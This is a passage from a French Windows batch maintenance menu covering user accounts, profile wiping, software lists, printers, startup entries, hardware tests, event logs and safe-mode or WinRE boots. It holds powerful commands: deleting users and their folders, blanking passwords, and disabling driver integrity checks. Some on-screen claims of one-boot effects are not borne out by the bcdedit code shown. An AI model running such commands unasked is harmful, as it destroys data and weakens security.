net user "%NEWU%" "%NEWP%" /add /y
goto um_add_check

:um_add_no_pwd
net user "%NEWU%" "" /add /y

:um_add_check
if not %errorlevel%==0 (
    echo Echec de creation de l'utilisateur.
    pause
    goto um_menu
)

set "ADDADM="
set /p ADDADM="Ajouter '%NEWU%' aux Administrateurs ? (O/N) > "
if /I "%ADDADM%"=="O" net localgroup "%UM_ADMIN_GROUP%" "%NEWU%" /add
echo.
echo [OK] Utilisateur cree avec succes.
pause
goto um_menu

:um_del
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER UN UTILISATEUR" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "DELU=!user_arr[%res%]!"
if not defined DELU goto um_menu

cls
echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer l'utilisateur '%DELU%'
echo ET TOUT SON ESPACE SUR LE DISQUE (Images, Documents, Bureau...) !
echo ======================================================
echo.
set /p CONF=Confirmer la suppression totale ? (Tapez OUI pour valider) ^> 
if /I not "%CONF%"=="OUI" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

echo Suppression du compte Windows en cours...
net localgroup "%UM_ADMIN_GROUP%" "%DELU%" /delete >nul 2>nul
net user "%DELU%" /delete

if not %errorlevel%==0 (
    echo [ECHEC] Impossible de supprimer le compte utilisateur '%DELU%'.
    pause
    goto um_menu
)

echo [OK] Utilisateur Windows supprime.
echo.
set "TMP_PS1=%temp%\wipe_profile_%RANDOM%.ps1"

echo param($u, $l) > "%TMP_PS1%"
echo $arg='/c rmdir /s /q "'+$u+'" ^>^> "'+$l+'" 2^>^&1' >> "%TMP_PS1%"
echo "RAPPORT: Nettoyage et suppression definitive du dossier "+$u ^| Out-File -Encoding UTF8 $l >> "%TMP_PS1%"
echo $p=Start-Process 'cmd.exe' -ArgumentList $arg -PassThru -WindowStyle Hidden >> "%TMP_PS1%"
echo $f=@('-', '\', '^|', '/') >> "%TMP_PS1%"
echo $i=0 >> "%TMP_PS1%"
echo while(-not $p.HasExited) { >> "%TMP_PS1%"
echo     Write-Host -NoNewline "`r[ $($f[$i]) ] (Journal dispo sur le Bureau) Effacement des fichiers...   " -ForegroundColor Cyan >> "%TMP_PS1%"
echo     $i=($i+1) %% 4 >> "%TMP_PS1%"
echo     Start-Sleep -Milliseconds 150 >> "%TMP_PS1%"
echo } >> "%TMP_PS1%"
echo Write-Host "`r[ OK ] Dossier personnel efface. L'utilisateur a completement disparu.                      " -ForegroundColor Green >> "%TMP_PS1%"

set "LOGFILE=%USERPROFILE%\Desktop\Suppression_Profil_%DELU%.log"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TMP_PS1%" "C:\Users\%DELU%" "%LOGFILE%"
del /f /q "%TMP_PS1%" >nul 2>&1

if exist "C:\Users\%DELU%" (
    echo.
    echo [!] NOTE: Certains fichiers verrouilles par l'OS n'ont pas pu
    echo etre effaces automatiquement ^(voir journal sur le Bureau^).
)

pause
goto um_menu


:um_reset
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "AJOUTER/MODIFIER LE MOT DE PASSE" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
set /p RNEWP=Nouveau mot de passe ^> 
set /p RNEWP2=Confirmez le mot de passe ^> 
if not "%RNEWP%"=="%RNEWP2%" (
    echo Les mots de passe ne correspondent pas.
    pause
    goto um_menu
)
net user "%RUSER%" "%RNEWP%"
if not %errorlevel%==0 (
    echo Echec de la mise a jour du mot de passe.
    pause
    goto um_menu
)

echo Mot de passe mis a jour.
set /p RFORCE=Exiger le changement au prochain logon ? (O/N) ^> 
if /I not "%RFORCE%"=="O" goto um_reset_end

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=[ADSI]('WinNT://' + $env:COMPUTERNAME + '/%RUSER%,user'); $u.PasswordExpired=1; $u.SetInfo()"
echo Obligation de changement au prochain logon active.

:um_reset_end
pause
goto um_menu

:um_remove_pwd
cls
set "user_opts="
set /a u_idx=0
for /f "tokens=*" %%U in ('powershell -NoProfile -Command "Get-LocalUser | Where-Object Enabled | Select-Object -ExpandProperty Name"') do (
    if defined user_opts (set "user_opts=!user_opts!;%%U") else (set "user_opts=%%U")
    set /a u_idx+=1
    set "user_arr[!u_idx!]=%%U"
)
if not defined user_opts (
    echo Aucun utilisateur actif trouve.
    pause
    goto um_menu
)

call :DynamicMenu "SUPPRIMER MDP (AUTO-LOGIN)" "%user_opts%"
set "res=%errorlevel%"
if "%res%"=="0" goto um_menu

set "RUSER=!user_arr[%res%]!"
if not defined RUSER goto um_menu

echo.
echo ======================================================
echo ATTENTION : Vous allez supprimer le mot de passe de '%RUSER%' !
echo Cela permettra a toute personne d'y acceder sans mot de passe a l'allumage.
echo.
set /p RCONFIRM=Voulez-vous vraiment continuer ? (O/N) ^> 
if /I not "%RCONFIRM%"=="O" (
    echo [X] Operation annulee.
    pause
    goto um_menu
)

net user "%RUSER%" "" >nul 2>&1
if %errorlevel%==0 (
    echo [OK] Mot de passe de l'utilisateur '%RUSER%' supprime avec succes.
) else (
    echo [ECHEC] Impossible de supprimer le mot de passe de '%RUSER%'.
)
pause
goto um_menu


:um_show_active
echo.
echo Utilisateurs actifs:
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-LocalUser | Where-Object Enabled | Sort-Object Name | Select-Object -ExpandProperty Name | ForEach-Object { $_ }" 2>nul
echo.
goto :eof

:um_exit
endlocal
goto system_tools
REM ================= End Embedded: Gestion des utilisateurs locaux =================

REM ===================================================================
REM              EXPORT LISTE DES LOGICIELS INSTALLES
REM ===================================================================
:sys_export_software
cls
echo ================================================
echo   EXPORT LISTE DES LOGICIELS INSTALLES
echo ================================================
echo.
echo  Choix du format d'export...
echo.
set "opts=Fichier TXT (lisible)~Liste simple texte sur le Bureau;Fichier CSV (Excel)~Format tableur avec colonnes separees par virgules"
call :DynamicMenu "EXPORT LOGICIELS INSTALLES" "%opts%"
set "sw_fmt=%errorlevel%"
if "%sw_fmt%"=="0" goto sys_export_menu

cls
echo ================================================
echo   ANALYSE DES LOGICIELS EN COURS...
echo ================================================
echo.
echo  [1/2] Interrogation du registre Windows...

if "%sw_fmt%"=="1" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.txt'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher -Unique); $nl=[Environment]::NewLine; $sep=New-Object string '=',60; $h='LISTE DES LOGICIELS INSTALLES - '+(Get-Date -Format 'dd/MM/yyyy HH:mm')+$nl+'Ordinateur : '+$env:COMPUTERNAME+$nl+'Total      : '+$apps.Count+' logiciels'+$nl+$sep; $h | Out-File $f -Encoding UTF8; $apps | ForEach-Object { '[+] '+$_.DisplayName+' v'+$_.DisplayVersion+' | '+$_.Publisher } | Out-File $f -Encoding UTF8 -Append; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes.') -f Green"
    echo.
    echo  [2/2] Fichier TXT cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.txt
) else (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Logiciels_Installes.csv'; $p=@('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*'); $apps=($p | ForEach-Object { Get-ItemProperty $_ -EA SilentlyContinue } | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate -Unique); $apps | Export-Csv $f -NoTypeInformation -Encoding UTF8 -Delimiter ';'; Write-Host ('  [OK] '+$apps.Count+' logiciels exportes en CSV.') -f Green"
    echo.
    echo  [2/2] Fichier CSV cree sur le Bureau !
    echo.
    echo  Fichier : Logiciels_Installes.csv
    echo  Ouvrez-le avec Excel ou LibreOffice Calc.
)
echo.
pause
goto sys_export_menu

REM ===================================================================
REM              GESTIONNAIRE D'IMPRIMANTES
REM ===================================================================
:sys_print_manager
cls
set "opts=Lister les imprimantes installees~Affiche toutes les imprimantes et leur statut;Vider la file d'attente~Supprime tous les travaux d'impression bloques (SPOOLER);Supprimer une imprimante~Retire completement une imprimante du systeme;Redemarrer le service Spooler~Relance le gestionnaire d'impression Windows"
call :DynamicMenu "GESTIONNAIRE D'IMPRIMANTES" "%opts%"
set "pr_choice=%errorlevel%"

if "%pr_choice%"=="1" goto print_list
if "%pr_choice%"=="2" goto print_clear_queue
if "%pr_choice%"=="3" goto print_remove
if "%pr_choice%"=="4" goto print_restart_spooler
if "%pr_choice%"=="0" goto system_tools
goto sys_print_manager

:print_list
cls
echo ================================================
echo   IMPRIMANTES INSTALLEES
echo ================================================
echo.
powershell -NoProfile -Command "Get-Printer | ForEach-Object { $jobs=(Get-PrintJob -PrinterName $_.Name -EA SilentlyContinue).Count; $j=if($jobs){$jobs}else{0}; Write-Host (' [+] '+$_.Name) -f Cyan -NoNewline; Write-Host (' | Statut: '+$_.PrinterStatus+' | Travaux en attente: '+$j) -f $(if($j -gt 0){'Yellow'}else{'Gray'}) }"
echo.
pause
goto sys_print_manager

:print_clear_queue
cls
echo ================================================
echo   VIDAGE DE LA FILE D'ATTENTE D'IMPRESSION
echo ================================================
echo.
echo  [1/3] Arret du service Spooler...
net stop Spooler >nul 2>&1
echo  [2/3] Suppression des travaux bloques...
del /Q /F /S "%SystemRoot%\System32\spool\PRINTERS\*" >nul 2>&1
echo  [3/3] Redemarrage du service Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] File d'attente videe et Spooler redemarre !
echo  Tous les travaux d'impression bloques ont ete supprimes.
echo.
pause
goto sys_print_manager

:print_remove
cls
echo ================================================
echo   SUPPRIMER UNE IMPRIMANTE
echo ================================================
echo.
echo  Imprimantes disponibles :
echo.
powershell -NoProfile -Command "$i=1; Get-Printer | ForEach-Object { Write-Host ('  ['+$i+'] '+$_.Name) -f Cyan; $i++ }"
echo.
set /p pr_name= Nom exact de l'imprimante a supprimer: 
if "%pr_name%"=="" goto sys_print_manager
echo.
powershell -NoProfile -Command "Remove-Printer -Name '%pr_name%' -EA SilentlyContinue; if($?){Write-Host '[OK] Imprimante supprimee avec succes.' -f Green}else{Write-Host '[ECHEC] Imprimante introuvable ou erreur.' -f Red}"
echo.
pause
goto sys_print_manager

:print_restart_spooler
cls
echo ================================================
echo   REDEMARRAGE DU SERVICE SPOOLER
echo ================================================
echo.
echo  Arret du Spooler...
net stop Spooler >nul 2>&1
timeout /t 2 /nobreak >nul
echo  Demarrage du Spooler...
net start Spooler >nul 2>&1
echo.
echo  [OK] Service Spooler redemarre avec succes.
echo.
pause
goto sys_print_manager

REM ===================================================================
REM              GESTIONNAIRE DES PROGRAMMES AU DEMARRAGE
REM ===================================================================
:sys_startup_manager
cls
echo ================================================
echo   PROGRAMMES AU DEMARRAGE DE WINDOWS
echo ================================================
echo.
echo  Analyse en cours...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$items = Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User;" ^
    "$i=1;" ^
    "Write-Host ('  Trouvé '+$items.Count+' programme(s) au démarrage:') -f Cyan;" ^
    "Write-Host '';" ^
    "foreach($x in $items){" ^
    "    Write-Host ('  ['+$i+'] '+$x.Name) -f White -NoNewline;" ^
    "    Write-Host (' | User: '+$x.User) -f DarkGray;" ^
    "    Write-Host ('       '+$x.Command) -f DarkGray;" ^
    "    $i++" ^
    "}"
echo.
echo ================================================
echo  Pour desactiver, ouvrez le Gestionnaire des taches
echo  (Ctrl+Shift+Esc) onglet 'Demarrage'.
echo.
set "opts=Desactiver via le Gestionnaire des taches~Ouvre directement Ctrl+Shift+Esc onglet Demarrage;Desactiver via Registre HKCU~Supprime une entree dans HKCU Run (utilisateur courant);Desactiver via Registre HKLM~Supprime une entree dans HKLM Run (tous utilisateurs)"
call :DynamicMenu "ACTION SUR LES PROGRAMMES DEMARRAGE" "%opts%"
set "su_choice=%errorlevel%"

if "%su_choice%"=="0" goto sys_opti_menu
if "%su_choice%"=="1" (
    powershell -Command "Start-Process taskmgr"
    timeout /t 2 /nobreak >nul
    goto sys_startup_manager
)
if "%su_choice%"=="2" goto startup_del_hkcu
if "%su_choice%"=="3" goto startup_del_hklm
goto sys_startup_manager

:startup_del_hkcu
cls
echo  Entrees dans HKCU\...\Run (utilisateur courant) :
echo.
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

:startup_del_hklm
cls
echo  Entrees dans HKLM\...\Run (tous utilisateurs) :
echo.
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2>nul
echo.
set /p su_name= Nom de valeur a supprimer: 
if "%su_name%"=="" goto sys_startup_manager
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%su_name%" /f
if %errorlevel%==0 (echo [OK] Entree '%su_name%' supprimee du demarrage.) else (echo [ECHEC] Entree introuvable.)
pause
goto sys_startup_manager

REM ===================================================================
REM              TEST DES COMPOSANTS PC (BENCHMARK)
REM ===================================================================
:sys_hw_test
cls
set "opts=Test SMART + Sante Disque~Verifie l'etat de sante SMART de tous les disques;Test de performance disque (WinSAT)~Score de vitesse lecture/ecriture du disque systeme;Test RAM (Windows Memory Diagnostic)~Lance le test memoire au prochain redemarrage;Rapport complet Composants~CPU, RAM, GPU, Disques - Resume technique;Tout tester en sequence~Lance tous les tests disponibles"
call :DynamicMenu "TEST DES COMPOSANTS PC" "%opts%"
set "hw_choice=%errorlevel%"

if "%hw_choice%"=="1" goto hw_smart
if "%hw_choice%"=="2" goto hw_winsat
if "%hw_choice%"=="3" goto hw_ram_test
if "%hw_choice%"=="4" goto hw_full_report
if "%hw_choice%"=="5" goto hw_all
if "%hw_choice%"=="0" goto system_tools
goto sys_hw_test

:hw_smart
cls
echo ================================================
echo   SANTE DES DISQUES - SMART
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$disks = Get-PhysicalDisk | Select-Object FriendlyName,MediaType,HealthStatus,OperationalStatus,Size;" ^
    "foreach($d in $disks){" ^
    "    $color = if($d.HealthStatus -eq 'Healthy'){'Green'}else{'Red'};" ^
    "    $size = [math]::Round($d.Size/1GB,1);" ^
    "    Write-Host ('  [+] '+$d.FriendlyName+' ('+$d.MediaType+', '+$size+' Go)') -f Cyan;" ^
    "    Write-Host ('      Sante: '+$d.HealthStatus+' | Statut: '+$d.OperationalStatus) -f $color;" ^
    "    Write-Host '' " ^
    "}"
echo.
pause
goto sys_hw_test

:hw_winsat
cls
echo ================================================
echo   TEST PERFORMANCE DISQUE (WinSAT)
echo ================================================
echo.
echo  [!] Test en cours, patientez (30-60 secondes)...
echo.
winsat disk -drive c >nul 2>&1
powershell -NoProfile -Command ^
    "$r=Get-CimInstance -ClassName Win32_WinSAT -EA SilentlyContinue;" ^
    "if($r){" ^
    "    Write-Host '  Scores WinSAT:' -f Cyan;" ^
    "    Write-Host ('  Disque          : '+$r.DiskScore) -f Green;" ^
    "    Write-Host ('  CPU             : '+$r.CPUScore) -f Green;" ^
    "    Write-Host ('  RAM             : '+$r.MemoryScore) -f Green;" ^
    "    Write-Host ('  Graphismes      : '+$r.GraphicsScore) -f Green;" ^
    "    Write-Host ('  Graphismes Gaming: '+$r.D3DScore) -f Green;" ^
    "    Write-Host '';" ^
    "    $d=$r.DiskScore;" ^
    "    if($d -ge 7.5){Write-Host '  [OK] Disque tres rapide (SSD NVMe ou equivalent)' -f Green}" ^
    "    elseif($d -ge 5.5){Write-Host '  [OK] Disque rapide (SSD SATA)' -f Yellow}" ^
    "    elseif($d -ge 3.0){Write-Host '  [ATTENTION] Disque lent (HDD ou SSD use)' -f Yellow}" ^
    "    else{Write-Host '  [CRITIQUE] Disque tres lent ou defaillant !' -f Red}" ^
    "}else{Write-Host '  [INFO] Score WinSAT non disponible, relancez le test.' -f Yellow}"
echo.
pause
goto sys_hw_test

:hw_ram_test
cls
echo ================================================
echo   TEST DE LA MEMOIRE RAM
echo ================================================
echo.
echo  Le test RAM necessite un redemarrage du PC.
echo  Windows effectuera le diagnostic avant de demarrer.
echo.
set /p ramconf= Planifier le test RAM au prochain demarrage ? (O/N): 
if /i "%ramconf%"=="O" (
    MdSched.exe
) else (
    echo  Operation annulee.
)
echo.
pause
goto sys_hw_test

:hw_full_report
cls
echo ================================================
echo   RAPPORT COMPLET DES COMPOSANTS
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$cpu=Get-CimInstance Win32_Processor | Select-Object -First 1;" ^
    "$ram=Get-CimInstance Win32_ComputerSystem;" ^
    "$pm=@(Get-CimInstance Win32_PhysicalMemory);" ^
    "$gpu=Get-CimInstance Win32_VideoController;" ^
    "$bios=Get-CimInstance Win32_BIOS;" ^
    "$mb=Get-CimInstance Win32_BaseBoard;" ^
    "$memTypes=@{20='DDR';21='DDR2';24='DDR3';26='DDR4';34='DDR5'};" ^
    "$mtype=if($pm.Count -gt 0 -and $memTypes.ContainsKey($pm[0].SMBIOSMemoryType)){$memTypes[$pm[0].SMBIOSMemoryType]}else{'Inconnu'};" ^
    "$ramGo=[math]::Round($ram.TotalPhysicalMemory/1GB,2);" ^
    "Write-Host '';" ^
    "Write-Host '  PROCESSEUR (CPU)' -f Cyan;" ^
    "Write-Host ('  '+$cpu.Name);" ^
    "Write-Host ('  Coeurs: '+$cpu.NumberOfCores+' | Threads: '+$cpu.NumberOfLogicalProcessors+' | Freq. base: '+$cpu.MaxClockSpeed+' MHz');" ^
    "Write-Host ('  Usage actuel: '+$cpu.LoadPercentage+'%%') -f $(if($cpu.LoadPercentage -lt 70){'Green'}else{'Red'});" ^
    "Write-Host '';" ^
    "Write-Host '  MEMOIRE RAM' -f Cyan;" ^
    "Write-Host ('  '+$ramGo+' Go - Type: '+$mtype+' - Slots utilises: '+$pm.Count);" ^
    "if($pm.Count -gt 0){Write-Host ('  Vitesse: '+$pm[0].Speed+' MHz | Fabricant: '+$pm[0].Manufacturer)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE GRAPHIQUE (GPU)' -f Cyan;" ^
    "foreach($g in $gpu){$vram=[math]::Round($g.AdapterRAM/1MB,0); Write-Host ('  '+$g.Name+' ('+$vram+' Mo VRAM) | Pilote: '+$g.DriverVersion)};" ^
    "Write-Host '';" ^
    "Write-Host '  CARTE MERE & BIOS' -f Cyan;" ^
    "Write-Host ('  Fabricant: '+$mb.Manufacturer+' | Modele: '+$mb.Product);" ^
    "Write-Host ('  BIOS: '+$bios.Manufacturer+' v'+$bios.SMBIOSBIOSVersion+' ('+$bios.ReleaseDate+')');" ^
    "Write-Host '';" ^
    "Write-Host '  DISQUES' -f Cyan;" ^
    "Get-PhysicalDisk | ForEach-Object {$s=[math]::Round($_.Size/1GB,1); Write-Host ('  '+$_.FriendlyName+' ('+$_.MediaType+', '+$s+' Go) - Sante: '+$_.HealthStatus) -f $(if($_.HealthStatus -eq 'Healthy'){'Green'}else{'Red'})}"
echo.
pause
goto sys_hw_test

:hw_all
call :hw_smart
call :hw_winsat
call :hw_full_report
goto sys_hw_test

REM ===================================================================
REM              JOURNAUX D'ERREURS WINDOWS FILTRES
REM ===================================================================
:sys_event_log
cls
set "opts=Erreurs critiques (24 dernieres heures)~Affiche les crashes et erreurs graves du jour;Erreurs critiques (7 derniers jours)~Vue hebdomadaire des problemes systeme;Erreurs application (24h)~Logiciels plantes ou en erreur aujourd'hui;Avertissements disque / stockage~Detecte les signes de defaillance materielle"
call :DynamicMenu "JOURNAUX D'ERREURS WINDOWS" "%opts%"
set "ev_choice=%errorlevel%"

if "%ev_choice%"=="0" goto system_tools
if "%ev_choice%"=="1" goto ev_critical_24h
if "%ev_choice%"=="2" goto ev_critical_7d
if "%ev_choice%"=="3" goto ev_app_24h
if "%ev_choice%"=="4" goto ev_disk_warn
goto sys_event_log

:ev_critical_24h
cls
echo ================================================
echo   ERREURS CRITIQUES - 24 DERNIERES HEURES
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucune erreur critique dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_critical_7d
cls
echo ================================================
echo   ERREURS CRITIQUES - 7 DERNIERS JOURS
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-7); $evts=Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 50; if(-not $evts){Write-Host '  [OK] Aucune erreur critique cette semaine.' -f Green} else{Write-Host ('  ' + $evts.Count + ' evenement(s) critique(s) (50 max):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_app_24h
cls
echo ================================================
echo   ERREURS APPLICATIONS - 24H
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddHours(-24); $evts=Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=$since} -EA SilentlyContinue | Select-Object -First 30; if(-not $evts){Write-Host '  [OK] Aucun crash applicatif dans les 24 dernieres heures.' -f Green} else{Write-Host ('  ' + $evts.Count + ' crash(s) applicatif(s):') -f Red; Write-Host ''; foreach($e in $evts){$msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 90){$msg=$msg.Substring(0,90)+'...'}; Write-Host ('  [' + $e.TimeCreated.ToString('HH:mm:ss') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f Yellow}}"
echo.
pause
goto sys_event_log

:ev_disk_warn
cls
echo ================================================
echo   AVERTISSEMENTS DISQUE / STOCKAGE
echo ================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$since=(Get-Date).AddDays(-30); $evts=Get-WinEvent -FilterHashtable @{LogName='System';ProviderName='disk','nvme','stornvme','iaStorAV';StartTime=$since} -EA SilentlyContinue | Where-Object {$_.Level -le 3} | Select-Object -First 20; if(-not $evts){Write-Host '  [OK] Aucun avertissement disque detecte (30 derniers jours).' -f Green} else{Write-Host ('  ' + $evts.Count + ' avertissement(s) disque:') -f Yellow; Write-Host ''; foreach($e in $evts){$lv=if($e.Level -eq 2){'ERR'}elseif($e.Level -eq 3){'WARN'}else{'CRIT'}; $msg=$e.Message.Split([Environment]::NewLine)[0].Trim(); if($msg.Length -gt 80){$msg=$msg.Substring(0,80)+'...'}; Write-Host ('  [' + $lv + '][' + $e.TimeCreated.ToString('dd/MM HH:mm') + '] ID:' + $e.Id + ' | ' + $e.ProviderName + ' | ' + $msg) -f $(if($e.Level -eq 2){'Red'}else{'Yellow'})}}"
pause
goto sys_event_log

REM ===================================================================
REM              MODE REPARATION ET DEMARRAGE WINDOWS
REM ===================================================================
:sys_winre
cls
set "opts=WinRE - Reparation directe~Boot dans l environnement de recuperation Windows (outil reagentc);BIOS / UEFI~Acces direct aux parametres firmware de la carte mere;Menu de demarrage (Boot Menu)~Selectionner le peripherique de demarrage (cle USB, disque...);Mode sans echec - Minimal~Demarrer sans pilotes tiers - le plus stable;Mode sans echec - Avec Reseau~Sans pilotes tiers + acces internet;Mode sans echec - Invite CMD~Safe Mode avec ligne de commande a la place de l Explorer;Desactiver signature pilotes~Installer des pilotes non signes (1 demarrage seulement);Verifier statut WinRE~Affiche l etat de l environnement de recuperation + flags bcdedit;Reinitialiser les parametres de demarrage~Supprimer tous les flags bcdedit appliques"
call :DynamicMenu "MODE DEMARRAGE / REPARATION WINDOWS" "%opts%"
set "wr_choice=%errorlevel%"

if "%wr_choice%"=="0" goto system_tools
if "%wr_choice%"=="1" goto winre_boot
if "%wr_choice%"=="2" goto winre_bios
if "%wr_choice%"=="3" goto winre_bootmenu
if "%wr_choice%"=="4" goto winre_safe_minimal
if "%wr_choice%"=="5" goto winre_safe_network
if "%wr_choice%"=="6" goto winre_safe_cmd
if "%wr_choice%"=="7" goto winre_nosign
if "%wr_choice%"=="8" goto winre_status
if "%wr_choice%"=="9" goto winre_reset
goto sys_winre

:winre_boot
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS WINRE (Environnement Reparation)
echo  ================================================
echo  Acces direct : Reparation / Restauration / CMD
echo  Redemarrage dans 5 secondes...
echo.
reagentc /boottore >nul 2>&1
if %errorlevel% neq 0 (
    echo  [ERREUR] WinRE indisponible sur ce PC.
    echo  Conseil : verifiez avec "Verifier statut WinRE".
    pause & goto sys_winre
)
echo  [OK] WinRE programme pour le prochain demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_bios
cls
echo.
echo  ================================================
echo   DEMARRAGE DANS LE BIOS / UEFI
echo  ================================================
echo  Acces direct au firmware de la carte mere.
echo  Redemarrage dans 5 secondes...
timeout /t 5 /nobreak >nul
shutdown /r /fw /t 0 & exit

:winre_bootmenu
cls
echo.
echo  ================================================
echo   MENU DE DEMARRAGE (BOOT MENU)
echo  ================================================
echo  Permet de choisir le peripherique de boot
echo  (cle USB, disque externe, lecteur reseau...).
echo.
echo  [1/2] Activation du boot menu...
bcdedit /set {bootmgr} displaybootmenu yes >nul 2>&1
echo  [2/2] Redemarrage dans 5 secondes...
echo.
echo  NOTE : Le boot menu sera desactive apres 1 boot
echo  normal pour ne pas alourdir le demarrage.
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_minimal
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - MINIMAL
echo  ================================================
echo  Pilotes de base uniquement. Le plus stable.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_network
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - AVEC RESEAU
echo  ================================================
echo  Pilotes de base + acces internet disponible.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot network >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_safe_cmd
cls
echo.
echo  ================================================
echo   MODE SANS ECHEC - INVITE DE COMMANDES
echo  ================================================
echo  Safe Mode avec shell CMD au lieu de l Explorer.
echo  Ce script se relancera pour restaurer le mode normal.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} safeboot minimal >nul 2>&1
bcdedit /set {current} safebootalternateshell yes >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SafeModeRevert" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
timeout /t 5 /nobreak >nul
shutdown /r /t 0 & exit

:winre_nosign
cls
echo.
echo  ================================================
echo   DESACTIVATION SIGNATURE PILOTES (1 BOOT)
echo  ================================================
echo  Permet d installer des pilotes non signes
echo  lors du prochain demarrage uniquement.
echo  Redemarrage dans 5 secondes...
bcdedit /set {current} nointegritychecks on >nul 2>&1
